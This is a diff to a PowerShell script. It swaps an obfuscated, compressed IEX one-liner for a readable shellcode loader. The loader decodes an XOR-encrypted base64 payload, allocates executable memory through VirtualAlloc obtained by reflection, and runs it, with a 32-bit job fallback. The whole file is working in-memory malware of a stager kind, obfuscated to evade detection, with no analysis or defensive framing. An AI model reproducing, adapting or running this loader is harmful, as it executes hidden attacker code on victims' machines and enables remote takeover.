@@ -1,1 +1,42 @@
-.((Get-VarIaBLe '*MdR*').name[3,11,2]-jOIN'')( NEW-OBJEcT  sysTEm.IO.STREaMReADer( (NEW-OBJEcT  IO.COMpreSsIon.deflATEstREAM([sySTEM.Io.MemOrystReaM] [sySTeM.CoNveRT]::FrOmbASe64sTrIng('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') ,[IO.COMpReSsiOn.cOMpReSSiOnmOdE]::deCOmpreSs ) ), [TExt.enCOdiNG]::aSCiI)).rEaDtoenD()
+$g8Ki3 =[TYpE]("{0}{1}{2}"-F'iNtP','t','r') ; .("{0}{2}{1}"-f 'S','ode','et-StrictM') -Version 2
+
+${Do`It} = @'
+function func_get_proc_address {
+        Param ($var_module, $var_procedure)
+        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')        $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
+}
+
+function func_get_delegate_type {
+        Param (
+                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+                [Parameter(Position = 1)] [Type] $var_return_type = [Void]
+        )
+
+        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+        $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
+
+        return $var_type_builder.CreateType()
+}
+
+[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDHFITRIjCeamLhn9X6JuLEQaQedyT3IlduRRPPbkO8JDVPcaQ9hC9o23J9GJV9c6nSwQArQ5xZ7vhBGrJSifqYcSOXWwVD7XnH9SUaMIuiN2UEZRDmJERk1XGQN0Sk1HTFRQDnZTR0JXRg5iREZNVwwSEw0TDRITExISDRIVEBsXA2BPSkZNVw5zUUxXTEBMTwwSDRcTLikj5TC0gNlJKMooNzt6kutNAAEl4QLFctJ7yZjbGJj/Po0rAVIjWi5s5ZMIMcScacjrUNdPLGufkU03Gi+QPP5DcLyYJbXG8y+rQc+yfFc42j7Zo9TP+7S/sYaf0Jtm5cPxaUAtRrHYJQoK4ugNM5H//E6QLqSMwzrf2I+88Z42osJguDSO1wx4WfmL8adyCWwce+9qYwKQpNpa5Y1agmhRcL2HplOOhuEbCk+yurX+KCaGVVH1/uMAlZaqYpAAuqjX5B3wBiFVQbaWfucQvpAYbdW8MjKgzIoB6XNNuENmEhFdEur9/YEjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BoSDRESEg0aEg0SEhMjfQ1bsw==')
+
+for ($x = 0; $x -lt $var_code.Count; $x++) {
+        $var_code[$x] = $var_code[$x] -bxor 35
+}
+
+$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+
+$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+$var_runme.Invoke([IntPtr]::Zero)
+'@
+
+If (  (  GeT-chIldiTEm ('v'+'A'+'Riable'+':'+'G8KI3')  ).VALuE::"s`ize" -eq 8) {
+        &("{0}{1}" -f 's','tart-job') { param(${a}) .("{1}{0}"-f'EX','I') ${a} } -RunAs32 -Argument ${d`oiT} | .("{2}{1}{0}" -f'b','ait-jo','w') | .("{2}{0}{1}" -f 'ive-','Job','Rece')
+}
+else {
+        .("{1}{0}" -f 'X','IE') ${DO`iT}
+}
